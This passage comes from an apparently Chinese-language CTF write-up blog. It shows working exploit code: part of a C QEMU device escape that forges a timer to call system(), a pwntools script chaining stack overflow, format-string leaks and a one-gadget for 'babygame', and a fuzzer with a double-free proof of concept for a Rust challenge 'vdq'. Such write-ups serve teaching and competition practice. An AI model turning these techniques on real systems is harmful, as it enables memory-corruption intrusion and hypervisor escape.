0x%llx\n&quot;</span>, control_addr);</span><br><span class="line">    <span class="keyword">uint64_t</span> timer = control_addr + <span class="number">0x12b8</span>;</span><br><span class="line">    <span class="keyword">uint64_t</span> bh = control_addr + <span class="number">0x12f8</span>;</span><br><span class="line">    <span class="keyword">uint64_t</span> timer_list = control_addr - <span class="number">0x1110b98</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] timer: 0x%llx bh: 0x%llx timer_list: 0x%llx\n&quot;</span>, timer, bh, timer_list);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// flip timer_enabled</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] flip timer_enabled\n&quot;</span>);</span><br><span class="line">    <span class="built_in">memset</span>(control, <span class="number">0</span>, <span class="keyword">sizeof</span>(*control));</span><br><span class="line">    control-&gt;switcher = <span class="number">0x10</span>;</span><br><span class="line">    control-&gt;fn1 = <span class="number">0</span>;</span><br><span class="line">    control-&gt;fn2 = <span class="number">0x2022</span>;</span><br><span class="line">    control-&gt;fn3 = <span class="number">0x300</span>;</span><br><span class="line">    control-&gt;field_9[<span class="number">0x300</span>] = <span class="number">0x1</span>;</span><br><span class="line">    trigger_process();</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] waiting...\n&quot;</span>);</span><br><span class="line">    sleep(<span class="number">3</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// check timer_enabled</span></span><br><span class="line">    timer_enabled = pmio_read(<span class="number">6</span>);</span><br><span class="line">    assert(timer_enabled &gt; <span class="number">0</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] timer_enabled: 0x%llx\n&quot;</span>, timer_enabled);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// set timer delay</span></span><br><span class="line">    pmio_write(<span class="number">10</span>, <span class="number">0x150</span>);</span><br><span class="line">    sleep(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// trigger timer again</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] trigger timer again\n&quot;</span>);</span><br><span class="line">    <span class="built_in">memset</span>(control, <span class="number">0</span>, <span class="keyword">sizeof</span>(*control));</span><br><span class="line">    control-&gt;switcher = <span class="number">0x30</span>;</span><br><span class="line">    control-&gt;fn1 = <span class="number">0x8</span>; <span class="comment">// cursor = 0x318</span></span><br><span class="line">    control-&gt;fn2 = <span class="number">0x0</span>; <span class="comment">// this will overwrite timer pointer</span></span><br><span class="line">    trigger_process();  <span class="comment">// so don&#x27;t trigger timer until construct a fake timer</span></span><br><span class="line">    sleep(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// overwrite copy src to bh</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] overwrite copy src to timer\n&quot;</span>);</span><br><span class="line">    <span class="built_in">memset</span>(control, <span class="number">0</span>, <span class="keyword">sizeof</span>(*control));</span><br><span class="line">    control-&gt;switcher = <span class="number">0x10</span>;</span><br><span class="line">    control-&gt;fn1 = <span class="number">0x0</span>;</span><br><span class="line">    control-&gt;fn2 = <span class="number">0x2022</span>;</span><br><span class="line">    control-&gt;fn3 = <span class="number">0x30f</span>; <span class="comment">// don&#x27;t overflow to bh</span></span><br><span class="line">    *(<span class="keyword">uint64_t</span> *)&amp;control-&gt;field_9[<span class="number">0x308</span>] = ((bh + <span class="number">0x10</span>) ^ control_addr);</span><br><span class="line">    </span><br><span class="line">    trigger_process();</span><br><span class="line">    sleep(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] waiting...&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">12</span>; ++i)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;.&quot;</span>);</span><br><span class="line">        sleep(<span class="number">3</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] copy timer\n&quot;</span>);</span><br><span class="line">    <span class="built_in">memset</span>(buf, <span class="number">0</span>, <span class="number">0x1000</span>);</span><br><span class="line">    <span class="built_in">memset</span>(control, <span class="number">0</span>, <span class="keyword">sizeof</span>(*control));</span><br><span class="line">    control-&gt;switcher = <span class="number">0x20</span>;</span><br><span class="line">    *((<span class="keyword">uint32_t</span> *)&amp;(control-&gt;fn1)) = buf_paddr;</span><br><span class="line">    *(<span class="keyword">uint16_t</span> *)&amp;control-&gt;field_9[<span class="number">2</span>] = <span class="number">0x318</span>;</span><br><span class="line">    trigger_process();</span><br><span class="line">    sleep(<span class="number">5</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">uint64_t</span> hfdev_process = *(<span class="keyword">uint64_t</span> *)&amp;buf[<span class="number">0x310</span>];</span><br><span class="line">    <span class="keyword">uint64_t</span> hfdev_func = hfdev_process + <span class="number">0x1c0</span>;</span><br><span class="line">    <span class="keyword">uint64_t</span> base_addr = hfdev_process - <span class="number">0xb0fd0</span>;</span><br><span class="line">    <span class="keyword">uint64_t</span> slide = hfdev_process - <span class="number">0x380fd0</span>;</span><br><span class="line">    <span class="keyword">uint64_t</span> system_plt = slide + <span class="number">0x2d6610</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] hfdev_process: 0x%llx\n&quot;</span>, hfdev_process);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] hfdev_func: 0x%llx\n&quot;</span>, hfdev_func);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] base_addr: 0x%llx\n&quot;</span>, base_addr);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] slide: 0x%llx\n&quot;</span>, slide);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] system_plt: 0x%llx\n&quot;</span>, system_plt);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// flip timer_enabled</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] flip timer_enabled\n&quot;</span>);</span><br><span class="line">    <span class="built_in">memset</span>(control, <span class="number">0</span>, <span class="keyword">sizeof</span>(*control));</span><br><span class="line">    control-&gt;switcher = <span class="number">0x10</span>;</span><br><span class="line">    control-&gt;fn1 = <span class="number">0</span>;</span><br><span class="line">    control-&gt;fn2 = <span class="number">0x2022</span>;</span><br><span class="line">    control-&gt;fn3 = <span class="number">0x300</span>;</span><br><span class="line">    control-&gt;field_9[<span class="number">0x300</span>] = <span class="number">0x1</span>;</span><br><span class="line">    trigger_process();</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] waiting...\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] overwrite timer to fake timer\n&quot;</span>);</span><br><span class="line">    <span class="built_in">memset</span>(control, <span class="number">0</span>, <span class="keyword">sizeof</span>(*control));</span><br><span class="line">    control-&gt;switcher = <span class="number">0x10</span>;</span><br><span class="line">    control-&gt;fn1 = <span class="number">0x0</span>;</span><br><span class="line">    control-&gt;fn2 = <span class="number">0x2022</span>;</span><br><span class="line">    control-&gt;fn3 = <span class="number">0x317</span>; <span class="comment">// don&#x27;t overflow to bh</span></span><br><span class="line">    *(<span class="keyword">uint64_t</span> *)&amp;control-&gt;field_9[<span class="number">0x310</span>] = ((control_addr + <span class="number">0x10</span>) ^ hfdev_process);</span><br><span class="line">    trigger_process();</span><br><span class="line">    sleep(<span class="number">1</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">FakeTimer</span></span></span><br><span class="line"><span class="class">    &#123;</span></span><br><span class="line">        <span class="keyword">int64_t</span> expire_time;</span><br><span class="line">        <span class="keyword">void</span> *timer_list;</span><br><span class="line">        <span class="keyword">void</span> *cb;</span><br><span class="line">        <span class="keyword">void</span> *opaque;</span><br><span class="line">        <span class="keyword">void</span> *next;</span><br><span class="line">        <span class="keyword">int</span> attributes;</span><br><span class="line">        <span class="keyword">int</span> scale;</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">FakeTimer</span> <span class="title">ft</span> =</span> &#123;</span><br><span class="line">        .expire_time = <span class="number">0x100</span>,</span><br><span class="line">        .timer_list  = timer_list,</span><br><span class="line">        .cb          = system_plt,</span><br><span class="line">        .opaque      = <span class="number">0x0</span>,</span><br><span class="line">        .next        = <span class="number">0x0</span>,</span><br><span class="line">        .attributes  = <span class="number">0x0</span>,</span><br><span class="line">        .scale       = <span class="number">0x0</span>,</span><br><span class="line">    &#125;;</span><br><span class="line">    pmio_write(<span class="number">10</span>, <span class="number">0x10</span>);</span><br><span class="line">    <span class="comment">// copy fake timer to control</span></span><br><span class="line">    <span class="keyword">uintptr_t</span> ftaddr = (<span class="keyword">uintptr_t</span>)(((<span class="keyword">uint64_t</span>)control) + <span class="number">0x10</span>);</span><br><span class="line">    <span class="built_in">memcpy</span>((<span class="keyword">void</span> *)ftaddr, &amp;ft, <span class="keyword">sizeof</span>(ft));</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">FakeTimer</span> *<span class="title">fake_timer</span> =</span> (struct FakeTimer *)((((<span class="keyword">uint64_t</span>)control) + <span class="number">0x10</span>));</span><br><span class="line">    fake_timer-&gt;opaque = (<span class="keyword">void</span> *)(control_addr + <span class="number">0x100</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] set fake_timer-&gt;opaque: 0x%llx\n&quot;</span>, fake_timer-&gt;opaque);</span><br><span class="line">    <span class="built_in">strcpy</span>((<span class="keyword">char</span> *)(((<span class="keyword">uint64_t</span>)control) + <span class="number">0x100</span>), <span class="string">&quot;ls -al&quot;</span>);</span><br><span class="line"></span><br><span class="line">    sleep(<span class="number">1</span>);</span><br><span class="line">    <span class="comment">// trigger timer again</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] trigger timer again\n&quot;</span>);</span><br><span class="line">    control-&gt;switcher = <span class="number">0x30</span>;</span><br><span class="line">    control-&gt;fn1 = <span class="number">0x8</span>;</span><br><span class="line">    control-&gt;fn2 = <span class="number">0x0</span>;</span><br><span class="line">    trigger_process();</span><br><span class="line"></span><br><span class="line">    sleep(<span class="number">1</span>);</span><br><span class="line">    <span class="keyword">while</span>(<span class="number">1</span>) &#123; &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>总体思路不难，但细节需要考虑一下，如果缺少对qemu方面的基本了解的话，逆向可能会有点麻烦。</p><h2 id="babygame">babygame</h2><p>确实是最简单的，第一个栈溢出泄漏一个栈地址，然后用字符串格式化泄漏canary和libc，改返回地址到<code>main</code>，再次栈溢出跳转one gadget即可。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">arr = [<span class="number">0</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">2</span>,  ]</span><br><span class="line"></span><br><span class="line">sh = process(<span class="string">&#x27;./babygame&#x27;</span>)</span><br><span class="line"></span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc-2.31.so&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload1 = <span class="string">b&quot;A&quot;</span>*(<span class="number">256</span>) + <span class="string">b&quot;A&quot;</span>*<span class="number">0x8</span> + <span class="string">b&quot;A&quot;</span>*<span class="number">0x8</span></span><br><span class="line">sh.recvuntil(<span class="string">b&quot;Please input your name:&quot;</span>)</span><br><span class="line">sh.send(payload1)</span><br><span class="line">sh.recvuntil(<span class="string">b&#x27;A&#x27;</span>*(<span class="number">256</span>+<span class="number">0x8</span>+<span class="number">0x8</span>))</span><br><span class="line"></span><br><span class="line">stackaddr = u64(sh.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">target = stackaddr - <span class="number">0x218</span></span><br><span class="line">log.success(<span class="string">&quot;stackaddr: &quot;</span> + <span class="built_in">hex</span>(stackaddr))</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> arr:</span><br><span class="line">    sh.recvuntil(<span class="string">b&quot;:&quot;</span>)</span><br><span class="line">    sh.sendline(<span class="built_in">str</span>(i).encode())</span><br><span class="line"></span><br><span class="line">sh.recvuntil(<span class="string">b&quot;you.\n&quot;</span>)</span><br><span class="line">sh.sendline(<span class="string">b&quot;%13$p%5219x%10$hn%27$paaa%29$paa&quot;</span>+p64(target)+p64(target))</span><br><span class="line"></span><br><span class="line">log.info(<span class="string">&quot;back to main if we are lucky&quot;</span>)</span><br><span class="line"></span><br><span class="line">r1 = sh.recv(<span class="number">18</span>)</span><br><span class="line">canary = <span class="built_in">int</span>(r1, <span class="number">16</span>)</span><br><span class="line">r1 = sh.recvuntil(<span class="string">b&#x27;0x&#x27;</span>)</span><br><span class="line">r1 = <span class="string">&quot;0x&quot;</span>+sh.recv(<span class="number">12</span>).decode()</span><br><span class="line"><span class="comment"># print(r1)</span></span><br><span class="line">atoiaddr = <span class="built_in">int</span>(r1, <span class="number">16</span>)</span><br><span class="line">libcbase = atoiaddr - <span class="number">0x445f4</span></span><br><span class="line">r1 = sh.recvuntil(<span class="string">b&#x27;aaa&#x27;</span>)</span><br><span class="line">r1 = sh.recv(<span class="number">14</span>)</span><br><span class="line">paddr = <span class="built_in">int</span>(r1, <span class="number">16</span>)</span><br><span class="line">programbase = paddr - <span class="number">0x12ef</span></span><br><span class="line">onegadget = libcbase + <span class="number">0xe3b31</span></span><br><span class="line">log.success(<span class="string">&quot;canary: &#123;&#125;&quot;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(canary)))</span><br><span class="line">log.success(<span class="string">&quot;atoiaddr: &#123;&#125;&quot;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(atoiaddr)))</span><br><span class="line">log.success(<span class="string">&quot;libcbase: &#123;&#125;&quot;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(libcbase)))</span><br><span class="line">log.success(<span class="string">&quot;programbase: &#123;&#125;&quot;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(programbase)))</span><br><span class="line">log.success(<span class="string">&quot;onegadget: &#123;&#125;&quot;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(onegadget)))</span><br><span class="line"></span><br><span class="line">payload =  <span class="string">b&quot;AAAA\x00\x00\x00\x00&quot;</span> + <span class="number">35</span> * p64(canary)</span><br><span class="line">payload += <span class="string">b&#x27;AAAAAAAA&#x27;</span></span><br><span class="line">payload += p64(onegadget)</span><br><span class="line"></span><br><span class="line">time.sleep(<span class="number">1</span>)</span><br><span class="line">sh.send(payload)</span><br><span class="line">time.sleep(<span class="number">1</span>)</span><br><span class="line">sh.sendline(<span class="string">b&#x27;0&#x27;</span>)</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><h2 id="vdq">vdq</h2><p>rust写的，不太懂，ida分析出来非常复杂，对rust字符串的分析稍微有点问题（因为字符串结尾的问题），经过逆向分析，程序需要用<code>[&quot;op1&quot;, &quot;op2&quot;, &quot;op3&quot;]\n$</code>这样的方式输入，没有去除符号，所以能直接确定op的类型，有add，remove，view，append，archive，并且add，append需要数据输入。</p><p>因为输入很简单，但整个程序分析起来很复杂，先选择fuzz一下，脚本如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">from</span> subprocess <span class="keyword">import</span> PIPE, STDOUT</span><br><span class="line"><span class="keyword">from</span> psutil <span class="keyword">import</span> Popen</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line">op = [<span class="string">&quot;\&quot;Add\&quot;&quot;</span>, <span class="string">&quot;\&quot;Remove\&quot;&quot;</span>, <span class="string">&quot;\&quot;Append\&quot;&quot;</span>, <span class="string">&quot;\&quot;View\&quot;&quot;</span>, <span class="string">&quot;\&quot;Archive\&quot;&quot;</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line"></span><br><span class="line">    opcnt = random.randint(<span class="number">0</span>, <span class="number">30</span>)</span><br><span class="line">    oplist = <span class="string">&quot;[&quot;</span></span><br><span class="line">    inputline = <span class="string">&quot;&quot;</span></span><br><span class="line">    linecnt = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(opcnt):</span><br><span class="line">        opindex = random.randint(<span class="number">0</span>, <span class="built_in">len</span>(op) - <span class="number">1</span>)</span><br><span class="line">        oplist += op[opindex]</span><br><span class="line">        <span class="keyword">if</span> opindex == <span class="number">0</span> <span class="keyword">or</span> opindex == <span class="number">2</span>:</span><br><span class="line">            inputline += <span class="built_in">str</span>(cyclic_metasploit(random.randint(<span class="number">0</span>, <span class="number">100</span>)).decode())+<span class="string">&quot;\n&quot;</span></span><br><span class="line">        <span class="keyword">if</span> i != opcnt - <span class="number">1</span>:</span><br><span class="line">            oplist += <span class="string">&quot;, &quot;</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            oplist += <span class="string">&quot;]&quot;</span></span><br><span class="line">    oplist += <span class="string">&quot;\n$\n&quot;</span></span><br><span class="line">    <span class="comment"># write to input file</span></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;input&quot;</span>, <span class="string">&quot;w&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        f.write(oplist)</span><br><span class="line">        f.write(inputline)</span><br><span class="line">    </span><br><span class="line">    cmd = <span class="string">&#x27;cat input | RUST_BACKTRACE=1 ./vdq&#x27;</span></span><br><span class="line">    p = Popen(cmd, shell=<span class="literal">True</span>, stdin=PIPE, stdout=PIPE, stderr=STDOUT, close_fds=<span class="literal">True</span>)</span><br><span class="line">    output, err = p.communicate()</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;Aborted&quot;</span> <span class="keyword">in</span> output.decode():</span><br><span class="line">        <span class="built_in">print</span>(output.decode())</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure><p>很快找到了一个double free，简化一下获得的poc</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">[&quot;Add&quot;, &quot;Add&quot;, &quot;Remove&quot;, &quot;Archive&quot;, &quot;Add&quot;, &quot;Add&quot;, &quot;Add&quot;, &quot;View&quot;, &quot;Remove&quot;, &quot;Remove&quot;, &quot;Remove&quot;]</span><br><span class="line">$</span><br><span class="line">Aa0Aa1Aa2Aa3Aa</span><br><span class="line">Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac</span><br><span class="line">Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab</span><br><span class="line">Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac</span><br><span class="line">Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7A</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>调试定位崩溃位置</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">gef➤  bt</span><br><span class="line">#0  0x00007ffff7a22e87 in raise () from ./libc-2.27.so</span><br><span class="line">#1  0x00007ffff7a247f1 in abort () from ./libc-2.27.so</span><br><span class="line">#2  0x00007ffff7a6d837 in ?? () from ./libc-2.27.so</span><br><span class="line">#3  0x00007ffff7a748ba in ?? () from ./libc-2.27.so</span><br><span class="line">#4  0x00007ffff7a7c0ed in free () from ./libc-2.27.so</span><br><span class="line">#5  0x000055555556d88e in alloc::alloc::dealloc (ptr=0x555555a38720, layout=...) at /rustc/7eac88abb2e57e752f3302f02be5f3ce3d7adfb4/library/alloc/src/alloc.rs:92</span><br><span class="line">#6  0x000055555556e07d in alloc::alloc::&#123;&#123;impl&#125;&#125;::dealloc (self=0x555555a38440, ptr=..., layout=...) at /rustc/7eac88abb2e57e752f3302f02be5f3ce3d7adfb4/library/alloc/src/alloc.rs:225</span><br><span class="line">#7  0x00005555555780c7 in alloc::raw_vec::&#123;&#123;impl&#125;&#125;::drop&lt;u8,alloc::alloc::Global&gt; (self=0x555555a38440) at /rustc/7eac88abb2e57e752f3302f02be5f3ce3d7adfb4/library/alloc/src/raw_vec.rs:504</span><br><span class="line">#8  0x000055555556bc3f in core::ptr::drop_in_place&lt;alloc::raw_vec::RawVec&lt;u8, alloc::alloc::Global&gt;&gt; () at /rustc/7eac88abb2e57e752f3302f02be5f3ce3d7adfb4/library/core/src/ptr/mod.rs:175</span><br><span class="line">#9  0x000055555556be45 in core::ptr::drop_in_place&lt;alloc::vec::Vec&lt;u8&gt;&gt; () at /rustc/7eac88abb2e57e752f3302f02be5f3ce3d7adfb4/library/core/src/ptr/mod.rs:175</span><br><span class="line">#10 0x0000555555567596 in core::ptr::drop_in_place&lt;vdq::Note&gt; () at /rustc/7eac88abb2e57e752f3302f02be5f3ce3d7adfb4/library/core/src/ptr/mod.rs:175</span><br><span class="line">#11 0x00005555555671d8 in core::ptr::drop_in_place&lt;alloc::boxed::Box&lt;vdq::Note&gt;&gt; () at /rustc/7eac88abb2e57e752f3302f02be5f3ce3d7adfb4/library/core/src/ptr/mod.rs:175</span><br><span class="line">#12 0x00005555555674a7 in core::ptr::drop_in_place&lt;[alloc::boxed::Box&lt;vdq::Note&gt;]&gt; () at /rustc/7eac88abb2e57e752f3302f02be5f3ce3d7adfb4/library/core/src/ptr/mod.rs:175</span><br><span class="line">#13 0x00005555555678eb in alloc::collections::vec_deque::&#123;&#123;impl&#125;&#125;::drop&lt;alloc::boxed::Box&lt;vdq::Note&gt;&gt; (self=0x7fffffffd860) at /rustc/7eac88abb2e57e752f3302f02be5f3ce3d7adfb4/library/alloc/src/collections/vec_deque.rs:171</span><br><span class="line">#14 0x0000555555567512 in core::ptr::drop_in_place&lt;alloc::collections::vec_deque::VecDeque&lt;alloc::boxed::Box&lt;vdq::Note&gt;&gt;&gt; () at /rustc/7eac88abb2e57e752f3302f02be5f3ce3d7adfb4/library/core/src/ptr/mod.rs:175</span><br><span class="line">#15 0x00005555555622d9 in vdq::handle_opr_lst (opr_lst=...) at src/main.rs:106</span><br><span class="line">#16 0x00005555555625cb in vdq::main () at src/main.rs:111</span><br></pre></td></tr></table></figure><p>然后定位崩溃的位置</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">.text:000000000000E2CC loc_E2CC:                               ; CODE XREF: vdq::handle_opr_lst::h7fb2393547b96358+7DA↑j</span><br><span class="line">.text:000000000000E2CC                 lea     rdi, [rsp+80h]  ; alloc::collections::vec_deque::VecDeque&lt;alloc::boxed::Box&lt;vdq::Note&gt;&gt; *</span><br><span class="line">.text:000000000000E2D4                 call    _ZN4core3ptr13drop_in_place17hc78e8b893c128756E ; core::ptr::drop_in_place::hc78e8b893c128756</span><br><span class="line">.text:000000000000E2D9                 jmp     short $+2</span><br></pre></td></tr></table></figure><p>查了一下<code>drop_in_place</code>会释放掉内存，这里的这个container里面存了<code>vdq::Note</code>，推断很有可能一个容器里一个note出现了不止一次或者一个note同时出现在两个容器（notes和archived_notes）<br>接下来缩减一下fuzz得到的poc，首先考虑的是<code>View</code>，直觉上看view的功能应该只是打印一下内容，不会对触发漏洞造成太大的影响，但是从poc里去掉View了之后，崩溃就消失了，那么View很可能有重要的影响。</p><p>所以调整一下fuzzer，只使用三个操作Add, Remove, View，并且设定前几个操作只能Add，然后继续fuzz</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">[&quot;Add&quot;, &quot;Add&quot;, &quot;Add&quot;, &quot;Remove&quot;, &quot;Add&quot;, &quot;Remove&quot;, &quot;Add&quot;, &quot;View&quot;, &quot;Remove&quot;, &quot;Add&quot;]</span><br><span class="line">$</span><br><span class="line">Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2A</span><br><span 